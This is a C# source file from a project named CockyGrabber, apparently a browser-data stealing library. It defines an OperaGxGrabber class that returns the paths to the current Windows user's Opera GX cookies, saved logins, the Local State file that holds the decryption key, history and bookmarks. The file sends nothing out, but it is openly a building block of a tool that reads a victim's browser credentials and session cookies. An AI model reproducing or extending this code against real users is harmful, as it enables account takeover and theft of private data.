using System;

namespace CockyGrabber.Grabbers
{
    public class OperaGxGrabber : BlinkGrabber

    {
        public override string CookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies";
            }
        }
        public override string LocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State";
            }
        }
        public override string LoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
            }
        }
        public override string HistoryPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History";
            }
        }
        public override string BookmarkPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Bookmarks";
            }
        }
    }
}